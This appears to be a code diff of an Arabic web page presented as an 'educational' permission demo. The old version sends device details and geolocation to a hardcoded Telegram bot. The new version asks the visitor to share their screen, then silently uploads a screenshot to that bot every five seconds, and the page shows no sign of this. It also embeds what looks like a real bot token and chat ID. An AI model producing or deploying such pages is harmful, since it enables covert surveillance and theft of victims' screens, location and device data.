@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>موقع تجريبي</title>
+    <title>طلب مشاركة الشاشة</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -27,128 +27,146 @@
             border-radius: 5px;
             cursor: pointer;
             margin: 10px;
+            font-size: 16px;
         }
         button:hover {
             background: #006699;
         }
-        #result {
+        #videoContainer {
             margin-top: 20px;
-            text-align: left;
-            padding: 10px;
-            background: #f9f9f9;
+        }
+        video {
+            max-width: 100%;
             border-radius: 5px;
+        }
+        #status {
+            margin-top: 10px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>موقع تجريبي</h1>
-        <p>هذا الموقع يطلب إذنك للوصول إلى بعض ميزات الهاتف لأغراض تعليمية.</p>
+        <h1>مشاركة الشاشة</h1>
+        <p>هذا الموقع يطلب إذنك لمشاركة شاشتك لأغراض تعليمية</p>
         
-        <button onclick="getDeviceInfo()">جمع معلومات الجهاز</button>
-        <button onclick="getLocation()">الحصول على الموقع</button>
-        <button onclick="accessCamera()">فتح الكاميرا</button>
-        <button onclick="accessMicrophone()">فتح الميكروفون</button>
+        <button id="shareBtn">مشاركة الشاشة</button>
+        <button id="stopBtn" disabled>إيقاف المشاركة</button>
         
-        <div id="result"></div>
+        <div id="videoContainer">
+            <video id="screenView" autoplay playsinline></video>
+        </div>
+        
+        <div id="status">لم يتم بدء المشاركة بعد</div>
     </div>
 
     <script>
         // استبدل بمعلومات بوت التلجرام الخاص بك
         const BOT_TOKEN = "7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU";
         const CHAT_ID = "7327464581";
-
-        // عرض النتائج في الصفحة
-        const resultDiv = document.getElementById('result');
-
-        // جمع معلومات الجهاز الأساسية
-        function getDeviceInfo() {
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language,
-                battery: "غير متاح",
-                location: "غير متاح",
-                ip: "غير متاح"
-            };
-
-            // محاولة الحصول على مستوى البطارية
-            if ('getBattery' in navigator) {
-                navigator.getBattery().then(battery => {
-                    deviceInfo.battery = `${Math.round(battery.level * 100)}%`;
-                    sendToTelegram(deviceInfo);
-                });
-            } else {
-                sendToTelegram(deviceInfo);
-            }
-
-            resultDiv.innerHTML = `<p>تم جمع معلومات الجهاز:</p><pre>${JSON.stringify(deviceInfo, null, 2)}</pre>`;
-        }
-
-        // الحصول على الموقع الجغرافي
-        function getLocation() {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        sendToTelegram({ location });
-                        resultDiv.innerHTML = `<p>تم الحصول على الموقع:</p><pre>${JSON.stringify(location, null, 2)}</pre>`;
+        
+        const shareBtn = document.getElementById('shareBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const screenView = document.getElementById('screenView');
+        const statusDiv = document.getElementById('status');
+        
+        let mediaStream = null;
+        let peerConnection = null;
+        let websocket = null;
+        let streamId = null;
+        
+        shareBtn.addEventListener('click', startSharing);
+        stopBtn.addEventListener('click', stopSharing);
+        
+        async function startSharing() {
+            try {
+                statusDiv.textContent = "جاري طلب إذن مشاركة الشاشة...";
+                
+                // طلب إذن مشاركة الشاشة
+                mediaStream = await navigator.mediaDevices.getDisplayMedia({
+                    video: {
+                        cursor: "always"
                     },
-                    error => {
-                        resultDiv.innerHTML = `<p style="color:red">خطأ في الحصول على الموقع: ${error.message}</p>`;
-                    }
-                );
-            } else {
-                resultDiv.innerHTML = "<p style='color:red'>المتصفح لا يدعم تحديد الموقع!</p>";
+                    audio: false
+                });
+                
+                statusDiv.textContent = "تم بدء مشاركة الشاشة بنجاح!";
+                shareBtn.disabled = true;
+                stopBtn.disabled = false;
+                screenView.srcObject = mediaStream;
+                
+                // هنا يجب عليك إعداد WebSocket و WebRTC لإرسال البث المباشر
+                // هذا الجزء يتطلب سيرفر وسيط لإدارة الاتصال
+                
+                // بدلاً من ذلك، سنقوم بإرسال لقطة من الشاشة كل بضع ثوان
+                startSendingScreenshots();
+                
+            } catch (error) {
+                statusDiv.textContent = `خطأ: ${error.message}`;
+                console.error("Error sharing screen:", error);
             }
         }
-
-        // فتح الكاميرا
-        function accessCamera() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    resultDiv.innerHTML = "<p>تم الوصول إلى الكاميرا!</p>";
-                    // يمكنك إرسال لقطة من الكاميرا إلى السيرفر (لكن هذا يتطلب المزيد من الكود)
-                })
-                .catch(err => {
-                    resultDiv.innerHTML = `<p style="color:red">خطأ في الوصول إلى الكاميرا: ${err.message}</p>`;
-                });
-        }
-
-        // فتح الميكروفون
-        function accessMicrophone() {
-            navigator.mediaDevices.getUserMedia({ audio: true })
-                .then(stream => {
-                    resultDiv.innerHTML = "<p>تم الوصول إلى الميكروفون!</p>";
-                    // يمكنك تسجيل الصوت وإرساله (لكن هذا يتطلب المزيد من الكود)
-                })
-                .catch(err => {
-                    resultDiv.innerHTML = `<p style="color:red">خطأ في الوصول إلى الميكروفون: ${err.message}</p>`;
-                });
-        }
-
-        // إرسال البيانات إلى بوت التلجرام
-        function sendToTelegram(data) {
-            const message = `📱 <b>بيانات جديدة:</b>\n\n<pre>${JSON.stringify(data, null, 2)}</pre>`;
+        
+        function stopSharing() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
             
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            })
-            .then(res => res.json())
-            .then(data => console.log("تم الإرسال!"))
-            .catch(err => console.error("Error:", err));
+            if (screenView.srcObject) {
+                screenView.srcObject = null;
+            }
+            
+            statusDiv.textContent = "تم إيقاف مشاركة الشاشة";
+            shareBtn.disabled = false;
+            stopBtn.disabled = true;
+            
+            // إيقاف إرسال اللقطات
+            if (screenshotInterval) {
+                clearInterval(screenshotInterval);
+                screenshotInterval = null;
+            }
         }
+        
+        let screenshotInterval = null;
+        
+        function startSendingScreenshots() {
+            // إرسال لقطة كل 5 ثوان
+            screenshotInterval = setInterval(() => {
+                captureAndSendScreenshot();
+            }, 5000);
+        }
+        
+        function captureAndSendScreenshot() {
+            if (!mediaStream) return;
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = screenView.videoWidth;
+            canvas.height = screenView.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(screenView, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'screenshot.png');
+                formData.append('caption', 'لقطة شاشة من المشاركة');
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log("تم إرسال اللقطة"))
+                .catch(error => console.error("Error sending screenshot:", error));
+            }, 'image/png');
+        }
+        
+        // ملاحظة: لإنشاء بث مباشر حقيقي، تحتاج إلى:
+        // 1. سيرفر وسيط (Signaling Server) باستخدام WebSocket
+        // 2. تنفيذ WebRTC للبث المباشر
+        // 3. سيرفر STUN/TURN للاتصال المباشر
+        // هذا يتجاوز نطاق هذا المثال البسيط
     </script>
 </body>
 </html>
